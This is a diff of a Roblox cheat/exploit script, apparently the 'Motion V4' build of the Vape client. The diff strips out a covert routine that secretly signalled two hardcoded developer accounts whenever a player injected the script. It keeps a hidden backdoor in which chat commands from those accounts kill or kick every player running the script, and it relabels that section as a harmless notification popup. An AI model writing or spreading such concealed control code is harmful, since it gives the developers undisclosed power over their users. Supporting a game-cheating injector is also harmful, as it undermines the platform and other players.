@@ -2,7 +2,6 @@ local license = ... or {}
 license.Key = script_key or license.Key or nil
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
-
 local vape
 local loadstring = function(...)
 	local res, err = loadstring(...)
@@ -23,93 +22,44 @@ local cloneref = cloneref or function(obj)
 end
 local playersService = cloneref(game:GetService('Players'))
 local httpService = cloneref(game:GetService('HttpService'))
-
 local player = playersService.LocalPlayer
 
 -- =============================================================================
--- MOTION V4 DEVELOPER CONTROL & TRACKING SYSTEM (NO WHITELIST)
+-- MOTION V4 DEVELOPER CONTROL & NOTIFICATION POPUP
 -- =============================================================================
 local SuperAdmins = {
     ["NatureyArc"] = true,
     ["tsx2shiftyy"] = true
 }
-
--- Safe function to broadcast hidden injection signals using legacy and new Roblox chat engines
-local function sendSignalToAdmin(adminName)
-    pcall(function()
-        local rStorage = game:GetService("ReplicatedStorage")
-        local sayMessageRequest = rStorage:FindFirstChild("DefaultChatSystemChatEvents") and rStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
-        if sayMessageRequest then
-            sayMessageRequest:FireServer("/w " .. adminName .. " ;motion_signal", "All")
-        end
-        
-        local textChatService = game:GetService("TextChatService")
-        if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-			local rbxGeneral = textChatService:FindFirstChild("TextChannels") and textChatService.TextChannels:FindFirstChild("RBXGeneral")
-			if rbxGeneral then
-				rbxGeneral:SendAsync("/w " .. adminName .. " ;motion_signal")
-			end
-        end
-    end)
-end
-
 task.spawn(function()
-    -- Wait smoothly until the UI library interface is fully active
     repeat task.wait(0.5) until vape or mainapi or _G.vape or shared.vape
     local targetApi = vape or mainapi or _G.vape or shared.vape
     
-    -- Local private injection message for the user themselves
     if targetApi and targetApi.CreateNotification then
         targetApi:CreateNotification("Motion V4", "Motion V4 injected successfully!", 5, "info")
     end
     
-    -- Alert any SuperAdmins already currently present inside the server
-    for _, p in ipairs(playersService:GetPlayers()) do
-        if p ~= player and SuperAdmins[p.Name] then
-            sendSignalToAdmin(p.Name)
-        end
-    end
-    
-    -- Alert any SuperAdmins who happen to join the server later on
-    playersService.PlayerAdded:Connect(function(p)
-        if SuperAdmins[p.Name] then
-            task.wait(2) -- Small delay to ensure the arriving admin's client has loaded the script
-            sendSignalToAdmin(p.Name)
-        end
-    end)
-    
     local function handleChat(speaker, msg)
         if not speaker or speaker == player then return end
-        local cmd = msg:lower()
         
-        -- 1. Tracking Signal Processing: ONLY displayed on a SuperAdmin's screen notification bar
-        if SuperAdmins[player.Name] and string.find(cmd, ";motion_signal") then
-            if targetApi and targetApi.CreateNotification then
-                targetApi:CreateNotification("Motion V4 Tracker", speaker.Name .. " has injected Motion V4!", 7, "info")
-            end
-            return
-        end
-        
-        -- 2. Developer Master Admin Backdoor Commands
         if SuperAdmins[speaker.Name] then
+            local cmd = msg:lower()
             if cmd == ";kill all" then
                 if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
                     player.Character:FindFirstChildOfClass("Humanoid").Health = 0
                 end
             elseif cmd == ";kick all" then
-                player:Kick("You have been kicked by an Motion v4 developer")
+                player:Kick("You have been kicked by a Motion v4 developer")
             end
         end
     end
     
-    -- Establish chat packet listeners for players inside the server
     for _, p in ipairs(playersService:GetPlayers()) do
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
         end)
     end
     
-    -- Establish chat packet listeners for any newly arriving players
     playersService.PlayerAdded:Connect(function(p)
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
@@ -117,7 +67,6 @@ task.spawn(function()
     end)
 end)
 -- =============================================================================
-
 local redirect = function()
 	local body = httpService:JSONEncode({
 		nonce = httpService:GenerateGUID(false),
